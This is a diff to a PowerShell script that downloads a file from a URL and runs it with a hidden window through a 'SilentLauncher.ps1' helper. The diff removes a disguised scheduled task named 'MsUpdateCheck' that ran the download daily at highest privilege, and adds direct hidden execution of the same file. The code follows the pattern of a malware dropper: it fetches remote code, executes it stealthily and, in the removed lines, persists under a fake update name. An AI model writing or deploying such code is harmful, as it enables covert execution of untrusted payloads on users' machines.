@@ -4,18 +4,9 @@ Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
 
 $launcherScriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "SilentLauncher.ps1"
 $launcherScriptContent = @"
-# SilentLauncher.ps1
-`$scriptPath = `"$dlPath`"
+`$scriptPath = '$dlPath'
 Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -File `"`$scriptPath`"" -NoNewWindow
 "@
 Set-Content -Path $launcherScriptPath -Value $launcherScriptContent
 
-$taskName = "MsUpdateCheck"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$dlPath`""
-$trigger = New-ScheduledTaskTrigger -Daily -At 12pm
-
-if (Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName}) {
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-}
-
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -User $env:USERNAME -Password (Read-Host "Enter your password" -AsSecureString)
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -File `"$dlPath`"" -NoNewWindow
